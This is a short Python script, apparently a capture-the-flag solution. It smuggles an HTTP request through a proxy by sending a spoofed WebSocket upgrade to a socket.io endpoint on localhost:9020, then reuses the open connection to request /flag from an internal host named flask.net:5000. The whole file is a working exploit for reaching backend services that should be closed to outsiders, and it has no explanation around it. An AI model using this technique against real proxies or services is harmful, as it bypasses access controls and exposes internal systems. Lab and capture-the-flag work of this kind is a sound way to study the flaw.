import socket 

req1 = """GET /socket.io/?EIO=3&transport=websocket HTTP/1.1
Host: localhost:9020
Sec-WebSocket-Version: 13
Upgrade: websocket
Connection: Upgrade

""".replace('\n', '\r\n')


req2 = """GET /flag HTTP/1.1
Host: flask.net:5000

""".replace('\n', '\r\n')

def main(netloc):
    host, port = netloc.split(':')

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, int(port)))

    sock.sendall(req1)
    data = sock.recv(4096)
    print(data)

    sock.sendall(req2)
    data = sock.recv(4096)
    data = data.decode(errors = 'ignore')

    print(data)

    sock.shutdown(socket.SHUT_RDWR)
    sock.close()

if __name__ == "__main__":
    main('localhost:9020')